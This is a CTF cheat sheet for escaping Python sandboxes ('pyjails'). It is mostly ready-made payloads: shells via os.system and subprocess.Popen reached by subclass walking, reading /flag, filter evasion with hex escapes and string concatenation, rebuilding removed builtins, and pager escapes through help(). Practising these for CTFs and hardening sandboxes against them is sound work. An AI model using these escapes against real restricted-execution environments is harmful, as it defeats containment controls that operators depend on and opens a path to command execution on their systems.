# Pyjail / Python sandbox escape catalog (CTF)

Figure out *what is filtered* (blacklist of words/chars, whitelist of allowed
chars, removed builtins, `audit` hooks, `eval` vs `exec` vs restricted `globals`),
then pick the matching bypass. Goal is usually read `/flag` or get a shell.

## Reconnaissance inside the jail
```python
print(dir())                      # names in scope
print(dir(__builtins__))          # remaining builtins (may be a dict or module)
print(globals())                  # what the challenge exposed
print(().__class__.__mro__)       # object chain for subclass walking
```

## Get a shell / run a command
```python
import os; os.system("sh")                                   # if import allowed
__import__("os").system("sh")                               # if __import__ present
os.popen("cat /flag").read()
breakpoint()                                                 # Py3.7+: pdb, then: import os
# via object subclasses (no import needed):
[x for x in ().__class__.__base__.__subclasses__()
   if x.__name__ == 'Popen'][0]('cat /flag', shell=True)    # subprocess.Popen
# warnings -> builtins -> __import__:
().__class__.__base__.__subclasses__()[IDX]()._module.__builtins__['__import__']('os').system('sh')
```
Find the right subclass index dynamically:
```python
subs = ().__class__.__base__.__subclasses__()
print([(i, c.__name__) for i, c in enumerate(subs)
       if c.__name__ in ('Popen', 'catch_warnings', '_wrap_close')])
```

## Read the flag without a shell
```python
open("/flag").read()
open("flag.txt").read()
print(__import__("os").listdir("."))        # find the filename
```

## Bypass keyword / substring filters
- `import`, `os`, `eval`, `system` blacklisted as substrings:
  ```python
  getattr(__import__("o"+"s"), "sys"+"tem")("sh")
  __import__("\x6f\x73").system("sh")        # hex-escaped 'os'
  globals()['__buil'+'tins__']
  ```
- `__` (dunder) blocked: use `getattr`/`vars`, or escape: `"\x5f\x5f"`,
  `"_"*2`, string concat `"__cl"+"ass__"`.
- `.` (attribute access) blocked: `getattr(obj, "attr")`,
  `operator.attrgetter("attr")(obj)`, or index `__doc__`/`__dict__`.
- quotes blocked: build strings with `chr(47)`, `str(...)`, f-strings `f"{obj=}"`,
  `().__doc__`, `bytes([...]).decode()`.
- digits blocked: `len([[]])`, `True+True`, `len("...")`.

## Restricted builtins / eval-only
- Only `eval(input())` with `__builtins__` removed → rebuild from object graph:
  ```python
  ().__class__.__base__.__subclasses__()   # walk to something with useful globals
  # e.g. any function's __globals__ may still hold __builtins__
  [c for c in ().__class__.__base__.__subclasses__()
     if hasattr(c, '__init__') and c.__init__.__class__.__name__=='function'][0]\
     .__init__.__globals__['__builtins__']
  ```
- f-string format exploits (leaking/calling): `f"{obj.__init__.__globals__}"`.

## Pager / help escapes
- `help()` then type `!sh` (pager runs shell). `license()`, `credits()`,
  `copyright()` open pagers too. Works when `()` calls are allowed and these
  builtins remain.

## audit hooks / `-S` restricted (hard mode)
- `sys.addaudithook` blocking `exec`/`import` → look for file read primitives,
  or use ctypes/`os` via a non-audited path; often the intended solution uses a
  specific unblocked function. Enumerate `dir(__builtins__)` and the exposed
  objects carefully.

## No-call `()`-free jails
- If parentheses are banned, you often need decorators (`@expr`), subscripting,
  or an unintended parser bug; in pure-eval these are usually unsolvable without
  another primitive — re-read the challenge for the allowed construct.

Resources: GTFOBins (shell-command escapes), HackTricks "Bypass Python
sandboxes". Keep payloads self-contained; test locally against the same filter.
